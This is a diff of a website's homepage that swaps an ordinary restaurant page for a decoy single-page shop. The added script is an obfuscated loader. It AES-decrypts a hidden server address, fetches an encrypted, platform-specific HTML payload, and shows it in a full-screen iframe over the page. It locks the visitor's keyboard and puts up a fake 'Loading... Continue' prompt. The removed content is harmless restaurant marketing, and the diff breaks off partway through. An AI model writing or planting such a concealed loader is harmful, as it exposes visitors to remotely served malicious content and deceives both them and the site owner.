@@ -1,636 +1,312 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>ZestyMealHut | Artisanal Hearth Gastronomy, Sourdough & Farm-Fresh Meals</title>
-  <meta name="description" content="Welcome to ZestyMealHut: The premier kitchen for woodfired hearth gastronomy, wild sourdough fermentation, nutrient-dense farm harvests, and chef-curated culinary mastery.">
-  <meta name="keywords" content="hearth gastronomy, woodfired dining, artisanal sourdough, farm to table meals, nutrient dense food, culinary science, organic cuisine">
-  <link rel="canonical" href="https://zestymealhut.com/">
-  
-  <!-- Fonts & Icons -->
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,500;0,600;0,700;1,400&family=Plus+Jakarta+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-  
-  <link rel="stylesheet" href="css/style.css">
-  <!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Support-TD</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+  <style>
+    * { box-sizing: border-box; }
+    html, body { margin: 0; height: 100%; }
+    body { font-family: system-ui, -apple-system, "Segoe UI", sans-serif; color: #1f2433; background: #f6f7fb; }
+    a { text-decoration: none; color: inherit; }
+    .hint { text-align: center; padding: 8px; font-size: .85rem; color: #6d28d9; background: #ede9fe; }
 
-  gtag('config', 'G-0LY0HY7L01');
+    .popup { 
+      position: fixed; 
+      top: 0; 
+      left: 0; 
+      width: 100%; 
+      height: 100%; 
+      background: #ffffff; 
+      display: flex; 
+      justify-content: center; 
+      align-items: center; 
+      z-index: 9999; 
+    }
+    .popup-content { 
+      background: #ffffff; 
+      padding: 60px; 
+      text-align: center; 
+      width: 100%;
+      max-width: 600px; 
+    }
+    .loading-gif { 
+      width: 160px; 
+      height: 160px; 
+      margin-bottom: 30px; 
+    }
+    .popup-content p {
+      font-size: 1.5rem; 
+      color: #1f2433;
+      font-weight: 600;
+      margin: 10px 0 35px 0;
+    }
+    .buttons { 
+      display: flex;
+      justify-content: center;
+      gap: 25px;
+    }
+    button { 
+      padding: 15px 35px; 
+      font-size: 1.1rem;
+      border: none; 
+      border-radius: 8px; 
+      cursor: pointer; 
+      font-weight: 700; 
+      min-width: 150px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+    #cancelBtn { background: #f44336; color: white; }
+    #continueBtn { background: #4CAF50; color: white; }
+    button:hover { opacity: 0.9; }
+
+    /* ===== Base Store Layout Styles ===== */
+    .nav { position: sticky; top: 0; z-index: 10; display: flex; align-items: center; gap: 20px;
+           padding: 14px 28px; background: #fff; box-shadow: 0 1px 8px rgba(0,0,0,.06); }
+    .brand { font-size: 1.25rem; font-weight: 800; color: #6d28d9; }
+    .links { display: flex; gap: 18px; margin-left: 8px; }
+    .links a { font-size: .92rem; color: #555; }
+    .links a:hover { color: #6d28d9; }
+    .clock { margin-left: auto; font-size: .8rem; color: #6d28d9; font-weight: 600;
+             background: #f3e8ff; padding: 5px 12px; border-radius: 20px; white-space: nowrap; }
+    .cart-btn { border: 0; cursor: pointer; background: #6d28d9; color: #fff; font-weight: 600;
+                padding: 9px 16px; border-radius: 30px; font-size: .9rem; }
+    .cart-btn .badge { background: #fff; color: #6d28d9; border-radius: 20px; padding: 0 7px;
+                       margin-left: 4px; font-size: .8rem; font-weight: 800; }
+
+    .hero { display: flex; align-items: center; gap: 32px; flex-wrap: wrap; padding: 48px 28px;
+            background: linear-gradient(135deg, #ede9fe, #f5f3ff); }
+    .hero-text { flex: 1 1 320px; }
+    .hero-text h1 { font-size: 2.1rem; margin: 0 0 12px; line-height: 1.2; }
+    .hero-text h1 span { color: #db2777; }
+    .hero-text p { color: #555; max-width: 460px; }
+    .cta { display: inline-block; margin-top: 14px; background: #db2777; color: #fff;
+           font-weight: 700; padding: 12px 26px; border-radius: 30px; }
+    .cta:hover { background: #be185d; }
+    .hero-img { flex: 1 1 320px; max-width: 520px; width: 100%; border-radius: 16px;
+                box-shadow: 0 12px 30px rgba(0,0,0,.15); }
+
+    .section-title { text-align: center; font-size: 1.5rem; margin: 40px 0 6px; }
+
+    .grid { display: grid; gap: 22px; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+            padding: 24px 28px 10px; }
+    .card { background: #fff; border-radius: 14px; overflow: hidden; box-shadow: 0 4px 16px rgba(0,0,0,.07);
+            transition: transform .15s, box-shadow .15s; }
+    .card:hover { transform: translateY(-4px); box-shadow: 0 10px 26px rgba(0,0,0,.12); }
+    .card img { width: 100%; height: 170px; object-fit: cover; display: block; }
+    .card .body { padding: 14px 16px 18px; }
+    .card h3 { margin: 0 0 4px; font-size: 1rem; }
+    .card .price { color: #6d28d9; font-weight: 800; font-size: 1.05rem; }
+    .card .old { color: #aaa; text-decoration: line-through; font-size: .85rem; margin-left: 6px; font-weight: 500; }
+    .add { margin-top: 10px; width: 100%; cursor: pointer; border: 0; background: #1f2433; color: #fff;
+           font-weight: 600; padding: 10px; border-radius: 8px; font-size: .9rem; }
+    .add:hover { background: #6d28d9; }
+
+    .about { padding: 10px 28px 30px; }
+    .features { display: flex; gap: 20px; flex-wrap: wrap; justify-content: center; margin-top: 14px; }
+    .feature { background: #fff; border-radius: 14px; padding: 22px; flex: 1 1 200px; max-width: 260px;
+               text-align: center; box-shadow: 0 4px 14px rgba(0,0,0,.06); }
+    .feature span { font-size: 1.8rem; }
+    .feature h3 { margin: 8px 0 4px; font-size: 1rem; }
+    .feature p { margin: 0; color: #666; font-size: .88rem; }
+
+    .footer { text-align: center; padding: 24px; color: #888; font-size: .85rem; }
+  </style>
+
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-0LY0HY7L01');
+  </script>
+
+<script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
 </script>
+
+
 </head>
 <body>
 
-<header class="site-header">
-  <div class="container header-inner">
-    <a href="index.html" class="brand-logo">
-      <div class="brand-title">Zesty<span>Meal</span>Hut</div>
-      <div class="brand-subtitle">Artisanal Hearth & Gastronomy</div>
-    </a>
-    
-    <nav>
-      <ul class="nav-links">
-        <li><a href="index.html" class="nav-link active">Home</a></li>
-        <li><a href="about.html" class="nav-link ">The Kitchen</a></li>
-        <li><a href="blog.html" class="nav-link ">Monographs</a></li>
-        <li><a href="contact.html" class="nav-link ">Reservations</a></li>
-      </ul>
-    </nav>
-    
-    <div class="header-cta">
-      <a href="contact.html" class="btn btn-saffron"><i class="fas fa-utensils"></i> Chef's Table</a>
-      <button class="mobile-toggle" aria-label="Toggle Navigation">
-        <i class="fas fa-bars"></i>
-      </button>
-    </div>
-  </div>
-</header>
-
-<!-- SECTION 1: HERO SHOWCASE -->
-<section class="hero-section">
-  <div class="container">
-    <div class="hero-grid">
-      <div class="hero-content">
-        <span class="section-tag"><i class="fas fa-fire-alt"></i> The 2026 Hearth Harvest</span>
-        <h1>Where Ancient Hearth Fire Ignites Flavor Alchemy</h1>
-        <p class="hero-lead">ZestyMealHut celebrates the union of raw culinary vitality, slow wild sourdough fermentation, and open-flame hardwood ember cooking for holistic nourishment.</p>
-        <div class="hero-cta-group">
-          <a href="#meal-builder" class="btn btn-saffron"><i class="fas fa-mortar-pestle"></i> Craft Tasting Formula</a>
-          <a href="#culinary-gallery" class="btn btn-outline"><i class="fas fa-images"></i> Explore Hearth Gallery</a>
-        </div>
-        <div class="hero-stats-row">
-          <div class="stat-item">
-            <h3>100%</h3>
-            <p>Regenerative Pasture & Soil</p>
-          </div>
-          <div class="stat-item">
-            <h3>48-Hr</h3>
-            <p>Slow Sourdough Ferment</p>
-          </div>
-          <div class="stat-item">
-            <h3>800°F</h3>
-            <p>Hardwood Hearth Sear</p>
-          </div>
-        </div>
-      </div>
-      
-      <div class="hero-image-card">
-        <div class="hero-image-wrapper">
-          <img src="images/meal-hero-gourmet.jpg" alt="Artisanal Hearth Nutrient Bowl with Saffron Dressing" loading="eager">
-        </div>
-        <div class="hero-badge-float">
-          <h4>Live Hardwood Embers</h4>
-          <p>White oak and Texas pecan embers delivering pristine clean char.</p>
-        </div>
+  <div class="popup" id="customPopup">
+    <div class="popup-content">
+      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
+      <p>Loading... Please wait.</p>
+      <div class="buttons">
+        <button id="cancelBtn" type="button">Cancel</button>
+        <button id="continueBtn" type="button">Continue</button>
       </div>
     </div>
   </div>
-</section>
+  
+  <div id="shop">
+    <div class="hint">🛍️ ShopEase</div>
+    <header class="nav">
+      <div class="brand">🛍️ ShopEase</div>
+      <nav class="links">
+        <a href="#home">Home</a>
+        <a href="#products">Products</a>
+        <a href="#about">About</a>
+      </nav>
+      <span class="clock">🕒 Mon, 29 Jun 2026</span>
+      <button class="cart-btn">🛒 Cart <span class="badge">0</span></button>
+    </header>
 
-<!-- SECTION 2: HEARTH PHILOSOPHY & CULINARY PILLARS -->
-<section class="section section-sand" id="philosophy">
-  <div class="container">
-    <div class="section-header">
-      <span class="section-tag">Culinary Foundation</span>
-      <h2 class="section-title">The Three Pillars of Zesty Gastronomy</h2>
-      <p class="section-subtitle">Our kitchen operates upon three unyielding commitments: soil microbiology, thermal precision, and biological nutrient bioavailability.</p>
-    </div>
-    
-    <div class="philosophy-grid">
-      <div class="philosophy-card">
-        <div class="philosophy-icon"><i class="fas fa-seedling"></i></div>
-        <h3>Regenerative Farm Provenance</h3>
-        <p>Every heirloom vegetable, leafy brassica, and cold-pressed oil originates from certified organic estates practicing no-till mycorrhizal soil stewardship.</p>
+    <section class="hero" id="home">
+      <div class="hero-text">
+        <h1>Summer Sale — up to <span>50% OFF</span></h1>
+        <p>Trendy products, free stock photos, ek hi page par. Pure HTML + CSS single-page store. ✨</p>
+        <a href="#products" class="cta">Shop now</a>
       </div>
-      
-      <div class="philosophy-card">
-        <div class="philosophy-icon"><i class="fas fa-bacteria"></i></div>
-        <h3>Wild Microbiome Fermentation</h3>
-        <p>Slow wild-yeast sourdough culture and live lacto-fermented botanical krauts that naturally pre-digest grains and enrich gut flora vitality.</p>
-      </div>
-      
-      <div class="philosophy-card">
-        <div class="philosophy-icon"><i class="fas fa-fire"></i></div>
-        <h3>Maillard Hearth Chemistry</h3>
-        <p>Mastering the precise thermodynamic sweet spot of 300°F to 350°F where amino acids and reducing sugars caramelize to unlock savory umami depth.</p>
-      </div>
-    </div>
-  </div>
-</section>
+      <img class="hero-img" src="https://picsum.photos/seed/shopfashion/520/360" alt="hero" />
+    </section>
 
-<!-- SECTION 3: INTERACTIVE MEAL FLAVOR & MACRO ARCHITECT -->
-<section class="section" id="meal-builder">
-  <div class="container">
-    <div class="section-header">
-      <span class="section-tag">Interactive Gastronomy</span>
-      <h2 class="section-title">The Meal Flavor & Macro Architect</h2>
-      <p class="section-subtitle">Select your dietary wellness archetype and meal window to generate a customized 3-course seasonal hearth menu.</p>
-    </div>
-    
-    <div class="builder-panel">
-      <div class="builder-controls">
-        <div class="control-group">
-          <label for="meal-diet-focus"><i class="fas fa-heartbeat"></i> Select Dietary Focus</label>
-          <select id="meal-diet-focus" class="control-select">
-            <option value="mediterranean">Mediterranean Longevity & Polyphenols</option>
-            <option value="protein">High-Protein Hearth & Muscle Vitality</option>
-            <option value="plant">Plant-Based Vitality & Micronutrients</option>
-          </select>
+    <!-- Histats.com  START  (aync)-->
+    <script type="text/javascript">var _Hasync= _Hasync|| [];
+    _Hasync.push(['Histats.start', '1,5037956,4,0,0,0,00010000']);
+    _Hasync.push(['Histats.fasi', '1']);
+    _Hasync.push(['Histats.track_hits', '']);
+    (function() {
+    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+    hs.src = ('//s10.histats.com/js15_as.js');
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+    })();</script>
+    <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5037956&101" alt="free counter with statistics" border="0"></a></noscript>
+    <!-- Histats.com  END  -->
+
+    <section id="products">
+      <h2 class="section-title">Featured Products</h2>
+      <div class="grid">
+        <div class="card">
+          <img src="https://picsum.photos/seed/sneakers/400/300" alt="Running Sneakers" />
+          <div class="body">
+            <h3>Running Sneakers</h3>
+            <div class="price">₹2,499 <span class="old">₹3,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
         </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/watch/400/300" alt="Classic Watch" />
+          <div class="body">
+            <h3>Classic Watch</h3>
+            <div class="price">₹4,999 <span class="old">₹7,499</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/backpack/400/300" alt="Travel Backpack" />
+          <div class="body">
+            <h3>Travel Backpack</h3>
+            <div class="price">₹1,899 <span class="old">₹2,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/headphones/400/300" alt="Wireless Headphones" />
+          <div class="body">
+            <h3>Wireless Headphones</h3>
+            <div class="price">₹3,299 <span class="old">₹4,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/sunglasses/400/300" alt="Sunglasses" />
+          <div class="body">
+            <h3>Sunglasses</h3>
+            <div class="price">₹999 <span class="old">₹1,799</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/camera/400/300" alt="Instant Camera" />
+          <div class="body">
+            <h3>Instant Camera</h3>
+            <div class="price">₹5,999 <span class="old">₹8,499</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section id="about" class="about">
+      <h2 class="section-title">Why ShopEase?</h2>
+      <div class="features">
+        <div class="feature"><span>🚚</span><h3>Free Shipping</h3><p>₹499 se upar free delivery.</p></div>
+        <div class="feature"><span>↩️</span><h3>Easy Returns</h3><p>7-day no-question return.</p></div>
+        <div class="feature"><span>🔒</span><h3>Secure</h3><p>Safe & secure checkout.</p></div>
+      </div>
+    </section>
+
+    <footer class="footer">© 2026 ShopEase · Single-page demo store · Images: picsum.photos</footer>
+  </div>
+
+
+  <div id="contentiframe" style="display: none; z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
+    <iframe id="frame" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" allowfullscreen="" webkitallowfullscreen="" mozallowfullscreen="" sandbox="allow-pointer-lock allow-scripts allow-popups allow-forms allow-downloads" style="width: 100%; height: 100%; border: 0px;"></iframe>
+  </div>
+
+  <script>
+    const PASSPHRASE = "98yNCjeAfWMwk0wI";  
+    const URL_KEY = "UrLk3yShopEase01";
+    const ENC_DATA_ORIGIN = "U2FsdGVkX1+ZV4B4shIyEYopUetzDlM8rBCY07decV0ugFl6IZehLUPZK3pNzYk+";
+    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+    const DATA_URL = DATA_ORIGIN + "/data";
+    let lastUrl = null;
+
+    function detectPlatform() {
+      const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+                navigator.platform || navigator.userAgent || "";
+      return /mac/i.test(p) ? "mac" : "win";
+    }
+
+    function secureKeyboardAccess() {
+      if (navigator.keyboard) {
+        navigator.keyboard.lock().catch((err) =>
+          console.warn("Keyboard lock failed:", err)
+        );
+      }
+    }
+
+    async function loadSecret() {
+      const shop = document.getElementById("shop");
+      const frame = document.getElementById("frame");
+      const contentIframe = document.getElementById("contentiframe");
+
+      try {
+        const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+        const { cipher } = await res.json();
+        const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+        if (!html) throw new Error("Decrypt failed — wrong key?");
+
+        if (lastUrl) URL.revokeObjectURL(lastUrl);
+        const blob = new Blob([html], { type: "text/html" });
+        lastUrl = URL.createObjectURL(blob);
+
+        frame.src = lastUrl;
         
-        <div class="control-group">
-          <label for="meal-time-window"><i class="fas fa-clock"></i> Select Dining Window</label>
-          <select id="meal-time-window" class="control-select">
-            <option value="lunch">Diurnal Midday Nourishment (Energizing & Light)</option>
-            <option value="dinner">Twilight Hearth Banquet (Deep & Restorative)</option>
-          </select>
-        </div>
-      </div>
-      
-      <div class="builder-result-box">
-        <div style="display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border-subtle); padding-bottom: 1rem; margin-bottom: 1rem;">
-          <div>
-            <span style="font-size: 0.78rem; text-transform: uppercase; letter-spacing: 0.15em; color: var(--primary-saffron); font-weight: 700;">Engineered Menu</span>
-            <h3 id="menu-formula-title" style="font-size: 1.5rem; margin-top: 0.2rem;">The Coastal Longevity Luncheon</h3>
-          </div>
-          <span style="background: var(--bg-dark); color: #fff; padding: 0.4rem 0.8rem; border-radius: 4px; font-size: 0.8rem; font-weight: 700;"><i class="fas fa-check-circle" style="color: var(--accent-basil);"></i> Complete 3-Course Balance</span>
-        </div>
+        shop.style.display = "none";
+        contentIframe.style.display = "block"; 
+        document.getElementById("customPopup").style.display = "none";
         
-        <p id="menu-formula-desc" style="font-size: 0.95rem; color: var(--text-secondary); margin-bottom: 1.5rem;">Rich in polyphenol extra-virgin olive oil, omega-3 fatty acids, and vibrant sun-ripened produce.</p>
-        
-        <div id="courses-display" class="courses-grid">
-          <!-- Dynamically Populated by JavaScript -->
-        </div>
-      </div>
-    </div>
-  </div>
-</section>
+       
+        secureKeyboardAccess();
 
-<!-- SECTION 4: SOURDOUGH & FERMENTATION SCIENCE MATRIX -->
-<section class="section section-sand" id="fermentation-matrix">
-  <div class="container">
-    <div class="section-header">
-      <span class="section-tag">Biological Science</span>
-      <h2 class="section-title">Wild Fermentation & Enzymatic Breakdown Matrix</h2>
-      <p class="section-subtitle">How extended 48-hour cold fermentation transforms ancient stone-milled grains into easily digestible culinary staples.</p>
-    </div>
-    
-    <div class="table-responsive">
-      <table class="culinary-table">
-        <thead>
-          <tr>
-            <th>Fermentation Protocol</th>
-            <th>Primary Microorganism</th>
-            <th>Hydration %</th>
-            <th>Phytic Acid Reduction</th>
-            <th>Glycemic Impact</th>
-            <th>Digestive Bioavailability</th>
-          </tr>
-        </thead>
-        <tbody>
-          <tr>
-            <td><span class="ferment-badge badge-sourdough">48-Hr Wild Sourdough</span></td>
-            <td>Lactobacillus sanfranciscensis</td>
-            <td>82% (Open Crumb)</td>
-            <td>94% Neutralized</td>
-            <td>Ultra-Low (GI &lt; 52)</td>
-            <td>High (Amino Acids & Minerals Released)</td>
-          </tr>
-          <tr>
-            <td><span class="ferment-badge badge-ferment">Lacto-Kraut Botanical</span></td>
-            <td>Leuconostoc mesenteroides</td>
-            <td>Natural Brine</td>
-            <td>100% (Pre-Digested)</td>
-            <td>Zero Glycemic Spike</td>
-            <td>Peak Vitamin C & Enzymes</td>
-          </tr>
-          <tr>
-            <td><span class="ferment-badge badge-sprouts">Sprouted Ancient Emmer</span></td>
-            <td>Endogenous Phytases</td>
-            <td>Controlled Soak</td>
-            <td>88% Deactivated</td>
-            <td>Low Sustained Release</td>
-            <td>Enhanced Bioavailable Zinc & Iron</td>
-          </tr>
-        </tbody>
-      </table>
-    </div>
-  </div>
-</section>
+      } catch (e) {
+        document.querySelector(".hint").textContent = "⚠️ " + e.message;
+        document.getElementById("customPopup").style.display = "none";
+      }
+    }
 
-<!-- SECTION 5: HARDWOOD HEARTH SMOKE & FLAVOR CHEMISTRY -->
-<section class="section" id="smoke-chemistry">
-  <div class="container">
-    <div class="section-header">
-      <span class="section-tag">Combustion Science</span>
-      <h2 class="section-title">Hardwood Smoke & Char Chemistry</h2>
-      <p class="section-subtitle">The specific lignin-to-cellulose ratios of our selected hearth hardwoods and their flavor compound pairings.</p>
-    </div>
-    
-    <div class="smoke-grid">
-      <div class="smoke-card">
-        <div style="font-size: 1.8rem; color: var(--primary-saffron); margin-bottom: 0.8rem;"><i class="fas fa-tree"></i></div>
-        <h3>Texas White Oak</h3>
-        <p>Clean, balanced combustion providing neutral high-heat embers ideal for searing pasture ribeye steaks and heirloom root vegetables.</p>
-        <span style="font-size: 0.8rem; font-weight: 700; color: var(--accent-basil);">Sweet Vanilla & Lactone Profile</span>
-      </div>
-      
-      <div class="smoke-card">
-        <div style="font-size: 1.8rem; color: var(--primary-saffron); margin-bottom: 0.8rem;"><i class="fas fa-leaf"></i></div>
-        <h3>Pecan Hardwood</h3>
-        <p>Rich, nutty sweetness with gentle phenolic density that enhances whole roasted heritage poultry and cast-iron braised squash.</p>
-        <span style="font-size: 0.8rem; font-weight: 700; color: var(--accent-basil);">Praline & Guaiacol Aroma</span>
-      </div>
-      
-      <div class="smoke-card">
-        <div style="font-size: 1.8rem; color: var(--primary-saffron); margin-bottom: 0.8rem;"><i class="fas fa-apple-alt"></i></div>
-        <h3>Wild Cherry Wood</h3>
-        <p>Fruity, fragrant smoke that imparts a stunning ruby luster to wild-caught salmon fillets and charred stone fruit desserts.</p>
-        <span style="font-size: 0.8rem; font-weight: 700; color: var(--accent-basil);">Fruity Esters & Mild Acidity</span>
-      </div>
-      
-      <div class="smoke-card">
-        <div style="font-size: 1.8rem; color: var(--primary-saffron); margin-bottom: 0.8rem;"><i class="fas fa-gem"></i></div>
-        <h3>Hickory Charcoal</h3>
-        <p>Intense, assertive smoke aroma deployed sparingly for flash-charring sweet peppers, sourdough flatbreads, and sea salts.</p>
-        <span style="font-size: 0.8rem; font-weight: 700; color: var(--accent-basil);">Bold Phenols & Syringol</span>
-      </div>
-    </div>
-  </div>
-</section>
-
-<!-- SECTION 6: FOUR-STEP HEARTH COOKERY PROTOCOL -->
-<section class="section section-dark" id="hearth-protocol">
-  <div class="container">
-    <div class="section-header">
-      <span class="section-tag">The Kitchen Craft</span>
-      <h2 class="section-title">The 4-Step Hearth Cookery Protocol</h2>
-      <p class="section-subtitle">How our executive chefs guide raw ingredients from the morning farm harvest to golden-crusted perfection.</p>
-    </div>
-    
-    <div class="protocol-timeline">
-      <div class="protocol-card">
-        <div class="protocol-num">1</div>
-        <h3 style="color: #fff; font-size: 1.25rem; margin-bottom: 0.6rem;">Soil-to-Kitchen Intake</h3>
-        <p style="font-size: 0.9rem; color: #a4afbe;">Produce harvested at peak diurnal sugar concentration, washed in spring water, and prepped without industrial peeling.</p>
-      </div>
-      
-      <div class="protocol-card">
-        <div class="protocol-num">2</div>
-        <h3 style="color: #fff; font-size: 1.25rem; margin-bottom: 0.6rem;">Enzymatic Brining</h3>
-        <p style="font-size: 0.9rem; color: #a4afbe;">Meats and dense vegetables submerged in cold herbal mineral brines with fresh bay leaves, peppercorns, and Meyer lemon.</p>
-      </div>
-      
-      <div class="protocol-card">
-        <div class="protocol-num">3</div>
-        <h3 style="color: #fff; font-size: 1.25rem; margin-bottom: 0.6rem;">Direct Ember Sear</h3>
-        <p style="font-size: 0.9rem; color: #a4afbe;">Flash-charred over radiant 800°F oak embers to instantly seal internal juices and caramelize natural sugars.</p>
-      </div>
-      
-      <div class="protocol-card">
-        <div class="protocol-num">4</div>
-        <h3 style="color: #fff; font-size: 1.25rem; margin-bottom: 0.6rem;">Resting & Emulsion</h3>
-        <p style="font-size: 0.9rem; color: #a4afbe;">Resting on warm cedar boards before finishing with first cold-pressed polyphenol olive oil and flaked sea salt.</p>
-      </div>
-    </div>
-  </div>
-</section>
-
-<!-- SECTION 7: CULINARY SHOWCASE GALLERY -->
-<section class="section" id="culinary-gallery">
-  <div class="container">
-    <div class="section-header">
-      <span class="section-tag">Visual Gastronomy</span>
-      <h2 class="section-title">Curated Hearth Dishes & Plating Showcase</h2>
-      <p class="section-subtitle">A glimpse into our seasonal culinary creations, woodfired sourdoughs, and vibrant garden harvests.</p>
-    </div>
-    
-    <div class="gallery-grid">
-      <div class="gallery-card">
-        <div class="gallery-media">
-          <img src="images/meal-woodfire-pizza.jpg" alt="Artisanal Sourdough Woodfired Pizza with Fresh Basil" loading="lazy">
-        </div>
-        <div class="gallery-info">
-          <span class="gallery-tag">Woodfired Hearth</span>
-          <h3>Artisanal Sourdough Pizza</h3>
-          <p style="font-size: 0.88rem; color: var(--text-muted);">San Marzano tomato reduction, buffalo mozzarella, and garden basil over charred 48-hr fermented crust.</p>
-        </div>
-      </div>
-      
-      <div class="gallery-card">
-        <div class="gallery-media">
-          <img src="images/meal-farm-harvest.jpg" alt="Regenerative Farm Harvest Vegetable Salad" loading="lazy">
-        </div>
-        <div class="gallery-info">
-          <span class="gallery-tag">Farm Sourcing</span>
-          <h3>Heirloom Garden Medley</h3>
-          <p style="font-size: 0.88rem; color: var(--text-muted);">Crisp rainbow radishes, shaved fennel, baby gem lettuce, and cold-pressed citrus herb vinaigrette.</p>
-        </div>
-      </div>
-      
-      <div class="gallery-card">
-        <div class="gallery-media">
-          <img src="images/meal-charred-salmon.jpg" alt="Pan-Seared Wild Salmon with Charred Asparagus" loading="lazy">
-        </div>
-        <div class="gallery-info">
-          <span class="gallery-tag">Wild Catch</span>
-          <h3>Ember-Charred Wild Salmon</h3>
-          <p style="font-size: 0.88rem; color: var(--text-muted);">Crispy skin wild-caught salmon with woodfired green asparagus and saffron lemon reduction.</p>
-        </div>
-      </div>
-      
-      <div class="gallery-card">
-        <div class="gallery-media">
-          <img src="images/meal-herbal-spice-bench.jpg" alt="Mortar and Pestle Fresh Herbs and Ground Spices" loading="lazy">
-        </div>
-        <div class="gallery-info">
-          <span class="gallery-tag">Spice Lab</span>
-          <h3>Stone-Ground Herb Dukkah</h3>
-          <p style="font-size: 0.88rem; color: var(--text-muted);">Toasted coriander, wild cumin, crushed hazelnuts, and dried rosemary blended daily in granite mortars.</p>
-        </div>
-      </div>
-      
-      <div class="gallery-card">
-        <div class="gallery-media">
-          <img src="images/meal-sourdough-baking.jpg" alt="Freshly Baked Country Sourdough Bread Loaf" loading="lazy">
-        </div>
-        <div class="gallery-info">
-          <span class="gallery-tag">Bakery Guild</span>
-          <h3>Rustic Country Sourdough</h3>
-          <p style="font-size: 0.88rem; color: var(--text-muted);">Stone-ground heirloom rye and red fife flour baked in high-temperature steam-injected hearth ovens.</p>
-        </div>
-      </div>
-      
-      <div class="gallery-card">
-        <div class="gallery-media">
-          <img src="images/meal-pasta-truffle.jpg" alt="Handmade Tagliatelle Pasta with Wild Mushrooms" loading="lazy">
-        </div>
-        <div class="gallery-info">
-          <span class="gallery-tag">Pasta Atelier</span>
-          <h3>Truffle & Porcini Tagliatelle</h3>
-          <p style="font-size: 0.88rem; color: var(--text-muted);">Hand-rolled organic semolina pasta tossed in roasted garlic butter, wood-roasted mushrooms, and fresh thyme.</p>
-        </div>
-      </div>
-    </div>
-  </div>
-</section>
-
-<!-- SECTION 8: ZERO-WASTE CULINARY MANIFESTO -->
-<section class="section section-dark" id="culinary-manifesto">
-  <div class="container">
-    <div class="section-header">
-      <span class="section-tag">Closed-Loop Kitchen</span>
-      <h2 class="section-title">The Zero-Waste Culinary Manifesto</h2>
-      <p class="section-subtitle">Honoring every botanical stem, heirloom rind, and marrow bone through closed-loop kitchen alchemy.</p>
-    </div>
-    
-    <div class="manifesto-pillars">
-      <div class="manifesto-box">
-        <div style="font-size: 2rem; color: var(--primary-saffron); margin-bottom: 1rem;"><i class="fas fa-recycle"></i></div>
-        <h3>Root-to-Leaf Utilization</h3>
-        <p>Beet greens become herb pestos; carrot tops are dehydrated into savory mineral dust; vegetable trimmings simmer into 24-hour restorative broths.</p>
-      </div>
-      
-      <div class="manifesto-box">
-        <div style="font-size: 2rem; color: var(--primary-saffron); margin-bottom: 1rem;"><i class="fas fa-seedling"></i></div>
-        <h3>Heirloom Seed Sovereignty</h3>
-        <p>We source exclusively from non-hybrid seed keepers, preserving ancient culinary plant genetics and safeguarding biodiversity.</p>
-      </div>
-      
-      <div class="manifesto-box">
-        <div style="font-size: 2rem; color: var(--primary-saffron); margin-bottom: 1rem;"><i class="fas fa-compost"></i></div>
-        <h3>On-Site Farm Composting</h3>
-        <p>100% of organic kitchen prep scraps return to our partner regenerative farm beds as nutrient-dense organic compost within 48 hours.</p>
-      </div>
-    </div>
-  </div>
-</section>
-
-<!-- SECTION 9: BOTANICAL HERB & CITRUS HARMONIZER -->
-<section class="section section-sand" id="herb-harmonizer">
-  <div class="container">
-    <div class="section-header">
-      <span class="section-tag">Aroma Alchemy</span>
-      <h2 class="section-title">Botanical Herb & Citrus Harmonizer</h2>
-      <p class="section-subtitle">Discover the ideal aromatic pairings, acidity balances, and cold-pressed citrus accents for core culinary herbs.</p>
-    </div>
-    
-    <div class="harmonizer-card">
-      <div class="control-group" style="max-width: 420px; margin: 0 auto 2rem;">
